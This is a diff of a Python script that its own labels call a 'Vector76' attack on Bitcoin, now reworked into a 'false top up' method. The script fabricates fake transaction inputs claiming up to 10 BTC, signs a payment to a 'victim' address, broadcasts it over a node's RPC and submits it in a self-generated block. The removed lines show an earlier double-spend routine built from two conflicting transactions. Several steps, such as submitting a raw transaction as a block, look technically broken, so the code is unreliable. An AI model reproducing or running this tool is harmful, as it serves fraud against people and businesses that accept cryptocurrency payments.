@@ -3,8 +3,10 @@ import requests
 import subprocess
 import bitcoin.rpc
 import bitcoin.core
-
 import cryptos
+import hashlib
+import uuid
+from bitcoinaddress import Wallet
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 parser.add_argument("node_host",
@@ -19,31 +21,17 @@ parser.add_argument("username",
 parser.add_argument("password",
                     help="Your BTC node password",
                     type=str)
-
-parser.add_argument("attacker_signkey",
-                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
-                    type=str)
-parser.add_argument("victim_address",
-                    help="Victim address.",
-                    type=str)
-parser.add_argument("attacker_address",
-                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
+parser.add_argument("send_to",
+                    help="Fake send btc to victim address.",
                     type=str)
 parser.add_argument("amount_of_coins",
-                    help="Amount of coins sent. (Enter in BTC units)",
+                    help="Amount of coins sent. (Enter in BTC units) Up to 10 BTC.",
                     type=float)
+
 parser.add_argument("--is_testnet",
-                    help="testnet flag (Default=True)",
+                    help="Testnet flag (Default=True)",
                     default=True,
                     type=bool)
-parser.add_argument("--fee",
-                    help="BTC send fee. (Default=0.0001)",
-                    default=0.0001,
-                    type=float)
-parser.add_argument("--last_txid",
-                    "-txid",
-                    help="Last txid (address of attacker_signkey)",
-                    type=str)
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
@@ -72,89 +60,88 @@ rpc_port = args.node_port
 username = args.username
 password = args.password
 
-key = args.attacker_signkey
-victim_address   = args.victim_address
-attacker_address = args.attacker_address
+victim_address   = args.send_to
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
-fee        = args.fee
-last_txid  = args.last_txid
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
 print("Connecting Public Node...")
 rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
                  service_port=rpc_port)
 print("OK")
-inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
-print(inputs)
 print()
+fake_from = Wallet()
 
-if amount_btc < fee:
-    print("[!] The fees exceed the amount sent. Please review the amount of fees and amount of BTC.")
+#inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
+
+fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
+fake_inputs = [{'tx_hash': fake_hash,
+                'tx_pos': 1,
+                'height': 2870812, 
+                'value': 1000000000, # = 10 BTC(Fake)
+                'address': fake_from.address.mainnet.pubaddr1}]
+if testnet:
+    fake_inputs[0]["address"] = fake_from.address.testnet.pubaddr1
+
+print(f"Fake Deposit Information : {fake_inputs}")
+if amount_btc > 10:
+    print(f"[!] Fake remittance amount exceeds 10BTC.")
     exit()
 
-change_address = transaction_util.wiftoaddr(key)
-balance = transaction_util.get_balance(change_address)["confirmed"]
-print(f"Balance (satoshi unit): {balance}")
-
+balance = fake_inputs[0]["value"]
 send_amount = to_satoshi(amount_btc)
-fee = to_satoshi(fee)
-change_btc_amt = (balance - (send_amount)) #おつり
-tx_victim = [{"address": victim_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
-tx_victim = transaction_util.mktx(inputs, tx_victim)
-tx_victim["ins"][0]["prev_hash"] = last_txid
-tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, key))
-print(tx_victim)
-tx_attacker = [{"address": attacker_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
-tx_attacker = transaction_util.mktx(inputs, tx_attacker)
-tx_attacker["ins"][0]["prev_hash"] = last_txid
-tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, key))
-print()
-print(tx_attacker)
-print()
-tx_vector76 = f"{tx_attacker}{tx_victim}"
-tx_vector76 = cryptos.serialize(transaction_util.sign(tx_vector76, 0, key))
-print(tx_vector76)
-exit()
-print("Mining Vector76 block...")
-payload = [attacker_address, [tx_vector76], False]
-print(f"Payload : {payload}")
-vector76_response = rpc_node.call("generateblock", attacker_address, [tx_vector76], False)
-print()
-print(f"Mining Response : {vector76_response}")
+change_btc_amt = (balance - send_amount) #おつり
+tx_victim = [{"address": victim_address, "value": send_amount}, {"address": fake_inputs[0]["address"], "value": change_btc_amt}]
+tx_victim = transaction_util.mktx(fake_inputs, tx_victim)
+tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.mainnet.wif))
+if testnet:
+    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.testnet.wif))
+#print(tx_victim)
+#tx_attacker = [{"address": attacker_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
+#tx_attacker = transaction_util.mktx(inputs, tx_attacker)
+#tx_attacker["ins"][0]["prev_hash"] = last_txid
+#tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, key))
+#print()
+#print(tx_attacker)
+#print()
+#tx_vector76 = f"{tx_attacker}{tx_victim}"
+#tx_vector76 = cryptos.serialize(transaction_util.sign(tx_vector76, 0, key))
+#print(tx_vector76)
 print()
 print("--------------------")
-print(f"Victim      : {victim_address}")
-print(f"Attacker    : {attacker_address}")
-print(f"Send Amount (Satoshi unit)    : {send_amount} Satoshi")
-print(f"Fee Amount  (Satoshi unit)    : {fee} Satoshi")
+print(f"Fake Send to                       : {victim_address}")
+print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
 print(f"Signed V1 RawTx           : {tx_victim}")
-print(f"Signed V2 RawTx           : {tx_attacker}")
-print(f"Vector76  Block           : {tx_vector76}")
-print(f"Mined Vector76 Block      : {vector76_response}")
 print(f"Testnet Mode              : {testnet}")
 print("--------------------")
 print()
 print()
 print("[+] READY...")
 print()
-input(" --- Press the enter key to continue the Vector76 attack... --- ")
+input(" --- Press the enter key to continue the false top up vector76 method attack... --- ")
 print()
 print("OK")
-print("push V1 TX...")
-broadcast_transaction(tx_victim, testnet)
+print("Send Fake TX...")
+result = rpc_node.sendrawtransaction(tx_victim)
+print(result)
+print("Mining Vector76 block...")
 
+vector76_response = None
+if testnet:
+    vector76_response = rpc_node.call("generateblock", fake_from.address.testnet.pubaddr1, tx_victim)
+else:
+    vector76_response = rpc_node.call("generateblock", fake_from.address.mainnet.pubaddr1, tx_victim)
+
+print(vector76_response)
 input("--- Send the block after pressing the enter key. --- ")
-print("Index > 既に送ったトランザクションに対して強制干渉を開始...")
+print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
 print()
-result = rpc_node.submitblock(tx_vector76)
+result = rpc_node.submitblock(tx_victim)
 print()
-print("C  V T W O  (V2トランサクションに変更)")
+print("SND ITX TOBC  (ブロックチェーンへ不正なトランザクションを送信!)")
 print(result)
 print()
 #ゴリ押し
-broadcast_transaction(tx_vector76, testnet)
-broadcast_transaction(vector76_response, testnet)
 result = rpc_node.submitblock(vector76_response)  #ゴリ押し
 print()
 #おまけ
